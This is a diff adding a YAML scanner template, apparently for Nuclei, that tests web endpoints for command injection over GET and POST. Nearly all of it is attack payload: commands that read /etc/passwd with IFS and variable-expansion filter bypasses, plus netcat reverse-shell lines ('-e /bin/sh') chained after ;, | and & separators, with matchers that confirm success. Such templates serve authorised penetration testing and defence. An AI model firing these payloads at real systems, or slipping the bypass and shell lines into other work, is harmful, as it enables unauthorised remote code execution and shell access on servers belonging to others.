@@ -1,0 +1,46 @@
+id: rce-p3
+
+info:
+  name: Command Injection - Obfuscation Techniques
+  author: custom
+  severity: critical
+  description: Command injection with IFS, variable expansion, and encoding bypasses
+  tags: rce,command-injection,waf-bypass,obfuscation
+
+http:
+  - raw:
+      - |
+        GET /{{path}}?cmd={{payload}} HTTP/1.1
+        Host: {{Hostname}}
+        
+      - |
+        POST /{{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        cmd={{payload}}
+
+    payloads:
+      payload:
+        - "cat%20/etc/passwd"
+        - "cat${IFS}/etc/passwd"
+        - "cat$u/etc$u/passwd$u"
+        - 'echo$IFS"RCE"'
+        - "ping -c 1 127.0.0.1"
+        - ";netcat -e /bin/sh 127.0.0.1 1337"
+        - "|netcat -e /bin/sh 127.0.0.1 1337"
+        - "&netcat -e /bin/sh 127.0.0.1 1337"
+      path:
+        - "test"
+        - "debug"
+        - "util"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "RCE"
+          - "64 bytes"
+        condition: or
